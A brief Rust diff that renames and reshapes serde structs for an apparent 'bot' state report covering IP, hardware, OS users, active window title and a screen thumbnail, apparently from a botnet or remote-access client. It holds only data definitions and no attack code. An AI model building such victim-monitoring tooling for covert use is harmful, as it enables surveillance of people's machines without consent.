@@ -2,11 +2,10 @@ use serde::{ Deserialize, Serialize };
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct BotState {
-    pub tag: String,
     pub ip_info: IpInfo,
     pub hw_info: HardwareInfo,
     pub os_info: OSInfo,
-    pub real_time_info: DynamicInfo,
+    pub dynamic_info: DynamicInfo,
     pub thumbnail: Option<Vec<u8>>,
 }
 
@@ -20,13 +19,13 @@ pub struct HardwareInfo {
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct OSInfo {
     pub boot_time: u64,
-    pub host_name: String,
-    pub os_version: String,
+    pub host_name: Option<String>,
+    pub os_version: Option<String>,
     pub users: Vec<String>,
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct DynamicInfo {
-    pub sysmem_uptime: u64,
+    pub system_uptime: u64,
     pub cpu_usage: f32,
     pub free_ram: u64,
     pub active_window: String,
